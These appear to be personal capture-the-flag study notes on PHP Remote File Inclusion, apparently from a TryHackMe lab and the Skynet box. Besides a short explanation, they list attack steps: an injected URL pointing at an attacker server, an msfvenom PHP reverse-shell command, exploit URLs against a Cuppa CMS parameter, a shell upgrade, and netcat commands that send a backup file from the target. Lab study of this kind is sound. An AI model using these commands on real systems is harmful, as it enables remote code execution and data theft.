RFI is a technique to include remote files into a vuln app. Like LFI, RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that the **allow_url_fopen** option needs to be on .

The risk is higher than LFI since RFI vulns allow an attacker to gain RCE on the server. Other conseuqesnces of a successful RFI attack include:

- sensitive information disclusure
- XSS
- DoS

![[Pasted image 20260508164845.png]]

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.



1. python3 -m http.server 8000
2. make file
3. http://10.0.2.15:8000/hostname.txt
4. http://10.114.190.223/playground.php?file=http://192.168.232.84:8000/hostname.php


msfvenom -p php/reverse_php LHOST=192.168.232.84 LPORT=4444 -f raw -o shell.txt

http://target/cuppa/alerts/alertConfigField.php?urlConfig=/tmp/shell.txt


need to:
1. host python server
2. make msfvenom revshell
3. upgrade shell python3 -c 'import pty; pty.spawn("/bin/bash")'
http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.232.84/shell.txt

find / -name "user.txt" 2>/dev/null


- **On your Kali Machine:** Set up your listener first. `nc -lvnp 1234 > backup.tgz`
    
- **On the Target (Skynet):** Send the file directly to your IP. `nc 192.168.232.84 1234 < /home/milesdyson/backups/backup.tgz`



